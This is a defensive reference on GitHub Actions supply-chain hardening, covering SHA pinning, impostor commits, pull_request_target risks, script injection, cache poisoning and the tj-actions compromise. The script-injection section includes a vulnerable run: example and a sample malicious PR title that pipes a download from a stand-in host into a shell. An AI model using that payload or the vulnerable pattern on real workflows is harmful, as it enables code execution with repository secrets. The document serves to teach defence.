# Supply chain

Fetched 2026-09-29 from https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions, https://github.com/actions/attest-build-provenance, https://docs.github.com/en/actions/reference/security/securely-using-pull_request_target, https://securitylab.github.com/resources/github-actions-preventing-pwn-requests, https://github.blog/changelog/2026-06-18-safer-pull_request_target-defaults-for-github-actions-checkout, https://www.cisa.gov/news-events/alerts/2025/03/18/supply-chain-compromise-third-party-tj-actionschanged-files-cve-2025-30066-and-reviewdogaction, https://www.wiz.io/blog/github-action-tj-actions-changed-files-supply-chain-attack-cve-2025-30066, https://adnanthekhan.com/2024/05/06/the-monsters-in-your-build-cache-github-actions-cache-poisoning, https://codeql.github.com/codeql-query-help/actions/actions-cache-poisoning-code-injection.

Contents: SHA pinning · resolving a tag to a SHA · impostor commits ·
attestations · "immutable actions" (not found) · `pull_request_target` and
checkout v7 · script injection · Dependabot for actions · cache poisoning ·
the tj-actions incident · sources.

## SHA pinning is the immutable form

GitHub's own hardening guide states that pinning an action to a full
commit SHA is "the only way to use an action as an immutable release" —
https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions.
A tag or branch ref can be repointed by whoever controls the action's
repository (see the tj-actions incident below); a SHA cannot.

```yaml
- uses: actions/checkout@0000000000000000000000000000000000000000 # v4
```

Keep the version as a same-line trailing comment. The comment is cosmetic
to the runner but is what keeps the pin readable to a human — and, per
that same guide, keeps it readable to Dependabot (see below), which
otherwise has no way to know what a raw 40-character SHA corresponds to.

## Resolving a tag to a SHA

Not from an official GitHub docs page — this is standard REST API
mechanics summarized from a dev.to walkthrough, not GitHub's own
documentation:

```bash
gh api repos/OWNER/REPO/commits/TAG --jq .sha
# or, to dereference an annotated tag explicitly:
gh api repos/OWNER/REPO/git/ref/tags/TAG --jq .object.sha
```

The first form resolves a tag (lightweight or annotated) to the commit
SHA it currently points at. The second walks the annotated-tag object
itself. Either is fine for pinning; re-run it when bumping a version,
since the whole point is that the tag can move.

## Impostor commits

A SHA that exists only in a fork of the action, not in the upstream
repository the `uses:` line names. `git` and GitHub's UI both resolve a
short or full SHA against any fork that has ever been pushed to GitHub,
including forks with no relationship to the maintainers, so a SHA that
"looks pinned" can still point at attacker-controlled code if it wasn't
actually resolved against the upstream repo. zizmor's `impostor-commit`
audit flags exactly this case (see `runtime-shape.md` for the tool).

## Attestations

Artifact attestations (build provenance, backed by Sigstore) went GA in
June 2024 — https://github.com/actions/attest-build-provenance, also
docs.github.com (using-artifact-attestations-to-establish-provenance-for-builds).
`actions/attest-build-provenance` is a higher-level wrapper around the
more general `actions/attest` action (needs `id-token: write`,
`attestations: write`, `contents: read`); call `actions/attest` directly
when the wrapper's fixed predicate shape doesn't fit.

## "Immutable actions": not a distinct feature

No evidence was found of an "immutable actions" GA feature distinct from
the two mechanisms above — NOT FOUND. What GitHub actually ships under
the word "immutable" is SHA pinning (this file) and the immutable OIDC
subject claims described in `permissions-and-oidc.md`. Don't cite an
"immutable actions" toggle or setting; it isn't there.

## `pull_request_target` and checkout v7's default refusal

`pull_request_target` runs with the base repository's `GITHUB_TOKEN` and
its secrets, even when the triggering pull request comes from a fork —
https://docs.github.com/en/actions/reference/security/securely-using-pull_request_target.
Checking out the fork's PR head and then running anything from it (a
build script, a test command) hands attacker-controlled code the base
repo's privileged token — GitHub's security lab names this a "pwn
request" — https://securitylab.github.com/resources/github-actions-preventing-pwn-requests.

`actions/checkout` v7 (released 2026-06-18) refuses by default to check
out an unreviewed fork PR head when triggered by `pull_request_target` or
`workflow_run` — https://github.blog/changelog/2026-06-18-safer-pull_request_target-defaults-for-github-actions-checkout.
The opt-out is explicit:

```yaml
- uses: actions/checkout@0000000000000000000000000000000000000000 # v7
  with:
    ref: ${{ github.event.pull_request.head.sha }}
    allow-unsafe-pr-checkout: true   # only with a real reason, reviewed
```

Treat `allow-unsafe-pr-checkout: true` itself as a finding worth a second
look in review — it exists specifically to bypass this guard. See
`review-pull-request-target` in `evals/` for the case this reference
backs.

## Script injection via `run:`

Untrusted values from the triggering event — a PR title, an issue body, a
commit message — are attacker-controlled text. Interpolating them
directly into a `run:` block with `${{ }}` makes them shell code, not
data — https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions.

```yaml
# vulnerable: the PR title is spliced into the shell command
- run: echo "Building ${{ github.event.pull_request.title }}"

# fixed: the value crosses into an environment variable first
- run: echo "Building $PR_TITLE"
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
```

The `env:` form still lets the value reach the script, but as a
variable's contents rather than as interpolated source — a title like
`"; curl evil.sh | sh #` no longer executes.

## Dependabot for actions

The hardening guide's point about keeping the version comment on a SHA
pin is specifically so Dependabot can still read the pin and open
version-bump PRs against it — same URL as SHA pinning above. Beyond that,
no further Dependabot configuration detail (e.g. `dependabot.yml`
ecosystem syntax) was captured in this pass; check the guide directly
before writing that file from memory.

## Cache poisoning through `restore-keys`

A low-privilege workflow (one that runs on a fork PR, say) can seed a
cache entry under a `restore-keys` prefix that a later, more privileged
workflow restores by that same prefix — the second workflow ends up
trusting cache contents an untrusted actor wrote. This is a blog-sourced
finding, not from GitHub's own docs — https://adnanthekhan.com/2024/05/06/the-monsters-in-your-build-cache-github-actions-cache-poisoning,
corroborated by CodeQL's query help for the class:
https://codeql.github.com/codeql-query-help/actions/actions-cache-poisoning-code-injection.
Those sources cite incidents against Angular (2024) and TanStack (2026).
See `runtime-shape.md` for `restore-keys` prefix-match mechanics — the
poisoning trap follows directly from how prefix matching resolves.

## The tj-actions/changed-files incident

In March 2025, tags `v1` through `v45.0.7` of `tj-actions/changed-files`
were rewritten to point at a malicious commit (CVE-2025-30066) that
dumped runner memory in build logs, exposing secrets in over 23,000
repositories — https://www.cisa.gov/news-events/alerts/2025/03/18/supply-chain-compromise-third-party-tj-actionschanged-files-cve-2025-30066-and-reviewdogaction,
https://www.wiz.io/blog/github-action-tj-actions-changed-files-supply-chain-attack-cve-2025-30066.
This is the case for SHA pinning stated above, not as a hypothetical: a
tag pin on this action, at the time, silently started running attacker
code on the next workflow run with no change to the caller's file.

## Sources

URLs are listed in the Fetched line above and inline per section. The
tag-to-SHA `gh api` recipe is a dev.to walkthrough, not an official
GitHub docs page; the cache-poisoning section is blog- and
CodeQL-sourced, not GitHub's own docs. Fetched 2026-09-29.
